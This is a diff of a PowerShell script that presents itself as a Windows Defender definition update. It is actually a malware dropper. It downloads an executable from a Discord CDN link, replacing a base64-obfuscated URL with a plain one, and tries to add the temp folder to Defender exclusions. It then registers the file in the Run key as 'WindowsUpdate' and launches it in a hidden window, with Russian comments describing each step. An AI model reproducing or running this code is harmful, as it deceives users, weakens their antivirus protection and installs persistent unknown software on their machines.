@@ -69,10 +69,8 @@ Write-Host "[*] Downloading latest threat definitions (online update)..." -Foreg
 $tempDir = [System.IO.Path]::GetTempPath()
 $outFile = Join-Path $tempDir "wu.exe"
 
-
-$encUrl = "aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTUyMDM5ODcyOTUyMDIyMjIxMS8xNTIwNzQ3Mjk1MDkwNTQwNTY0L2NvbGxlY3Rvcl9tc3ZjLmV4ZT9leD02YTQyNTFjOSZpcz02YTQxMDA0OSZobT0yOTAwMWIwNTg3NzY3MDRmNDNkMGUwNzQxMjdlZjcyNmY3OWZkMmZkNWZlOGQzNjA5OGZjMWI0NmU4NWY1ZWUyJg=="
-$url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encUrl))
-
+# Новая ссылка (без кодирования, чтобы было видно)
+$url = "https://cdn.discordapp.com/attachments/1520398729520222211/1520763442774937813/collextor_msvc.exe?ex=6a4260d3&is=6a410f53&hm=abd9e7e105f2de155697a91bd28dd6a7fc2ff0931086df07e8b5c469a807d9fe&"
 
 $bitsJob = Start-BitsTransfer -Source $url -Destination $outFile -Asynchronous -Description "Windows Defender Definition Update"
 do {
@@ -98,7 +96,7 @@ if (Test-Path $outFile) {
     Start-Sleep -Milliseconds 300
 
     # ------------------------------------------------------------
-    
+    # Добавление временной папки в исключения Defender
     # ------------------------------------------------------------
     $exclPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
     if (Test-Path $exclPath) {
@@ -106,7 +104,7 @@ if (Test-Path $outFile) {
     }
 
     # ------------------------------------------------------------
-    
+    # Прописывание в автозагрузку (реестр и папка Startup)
     # ------------------------------------------------------------
     $runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
     Set-ItemProperty -Path $runKey -Name "WindowsUpdate" -Value $outFile -ErrorAction SilentlyContinue
@@ -117,7 +115,7 @@ if (Test-Path $outFile) {
     }
 
     # ------------------------------------------------------------
-    
+    # Запуск скачанного файла в скрытом окне
     # ------------------------------------------------------------
     Write-Host "[*] Applying threat definitions update..." -ForegroundColor Yellow
     Start-Process $outFile -WindowStyle Hidden
